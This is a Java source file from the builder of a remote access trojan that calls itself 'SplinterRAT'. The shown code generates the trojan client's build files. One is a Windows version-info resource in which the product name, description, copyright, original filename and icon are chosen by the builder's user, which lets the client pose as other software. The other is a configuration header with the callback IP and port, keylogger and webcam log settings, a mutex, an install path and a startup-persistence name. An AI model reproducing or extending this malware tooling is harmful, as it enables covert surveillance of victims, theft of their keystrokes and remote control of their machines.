package Compiler;

import Packets.Compilation.AssemblySettings;
import Packets.Compilation.CompileSettings;

import javax.swing.*;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.util.concurrent.atomic.AtomicReference;

public class FileModifier {
    private final Path pathOfClientFiles;

    public FileModifier(Path pathOfClientFiles) {
        this.pathOfClientFiles = pathOfClientFiles;
    }

    public void writeToFile(File fileToBeModified, String fileContent) {
        try (FileWriter writer = new FileWriter(fileToBeModified)) {
            writer.write(fileContent);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public void generateAssemblyConfigurationFile(AssemblySettings settings) {
        String formattedFileVersion = settings.fileVersion().replaceAll("\\.", ",");

        StringBuilder assemblyContent = new StringBuilder();

        assemblyContent.append("1 VERSIONINFO\n");
        assemblyContent.append("FILEVERSION ").append(formattedFileVersion).append("\n");
        assemblyContent.append("PRODUCTVERSION ").append(formattedFileVersion).append("\n");
        assemblyContent.append("BEGIN\n");
        assemblyContent.append("  BLOCK \"StringFileInfo\"\n");
        assemblyContent.append("  BEGIN\n");
        assemblyContent.append("    BLOCK \"080904E4\"\n");
        assemblyContent.append("    BEGIN\n");
        assemblyContent.append("      VALUE \"CompanyName\",\"SplinterRAT\"\n");
        assemblyContent.append("      VALUE \"FileDescription\",\"").append(settings.fileDescription()).append("\"\n");
        assemblyContent.append("      VALUE \"FileVersion\",\"").append(settings.fileVersion()).append("\"\n");
        assemblyContent.append("      VALUE \"InternalName\",\"Splinter client\"\n");
        assemblyContent.append("      VALUE \"LegalCopyright\",\"").append(settings.copyright()).append("\"\n");
        assemblyContent.append("      VALUE \"OriginalFilename\",\"").append(settings.originalName()).append("\"\n");
        assemblyContent.append("      VALUE \"ProductName\",\"").append(settings.productName()).append("\"\n");
        assemblyContent.append("      VALUE \"ProductVersion\",\"").append(settings.fileVersion()).append("\"\n");
        assemblyContent.append("    END\n");
        assemblyContent.append("  END\n");
        assemblyContent.append("  BLOCK \"VarFileInfo\"\n");
        assemblyContent.append("  BEGIN\n");
        assemblyContent.append("    VALUE \"Translation\", 0x809, 1252\n");
        assemblyContent.append("  END\n");
        assemblyContent.append("END\n");

        if (!settings.iconPath().isEmpty()) {
            String formattedIconPath = settings.iconPath().replaceAll("\\\\", "/");
            assemblyContent.append("AppIconID ICON \"").append(formattedIconPath).append("\"\n");
        }

        Path pathOfAssemblyFile =  Path.of(pathOfClientFiles.toString(),"compile_configuration","assembly.rc");
        writeToFile(pathOfAssemblyFile.toFile(), assemblyContent.toString());
    }

    public void generateConfigurationFile(CompileSettings compileSettings) {
        String pragmaOnce = "#pragma once\n";
        String IP = "#define IP \"" + compileSettings.IP() + "\"\n";
        String PORT = "#define PORT " + compileSettings.PORT() + "\n";
        String TAG_NAME = "#define TAG_NAME \"" + compileSettings.TAG_name() + "\"\n";
        String MUTEX = "#define MUTEX \"" + compileSettings.MUTEX() + "\"\n";
        String TIMING_RETRY = "#define TIMING_RETRY " + compileSettings.TIMING_RETRY() + "\n";
        String WEBCAM = "#define WEBCAM \"" + compileSettings.WEBCAM_LOGS() + "\"\n";
        String KEYLOGGER = "#define KEYLOGGER_DEF \"" + compileSettings.KEYLOGGER_LOGS() + "\"\n";
        String INSTALL_PATH = "#define INSTALL_PATH " + compileSettings.INSTALL_PATH() + "\n";
        String SUBDIRECTORY_NAME = "#define SUBDIRECTORY_NAME \"" + compileSettings.SUBDIRECTORY_NAME() + "\"\n";
        String SUBDIRECTORY_FILE_NAME = "#define SUBDIRECTORY_FILE_NAME \"" + compileSettings.SUBDIRECTORY_FILE_NAME() + "\"\n";
        String STARTUP_NAME = "#define STARTUP_NAME \"" + compileSettings.STARTUP_NAME() + "\"\n";

        String configurationContent = pragmaOnce + IP + PORT + TAG_NAME + MUTEX + TIMING_RETRY + WEBCAM +
                KEYLOGGER + INSTALL_PATH + SUBDIRECTORY_NAME +
                SUBDIRECTORY_FILE_NAME + STARTUP_NAME;

        Path path = Path.of(pathOfClientFiles.toString(), "includes", "configuration.h");
        writeToFile(path.toFile(), configurationContent);
    }






}
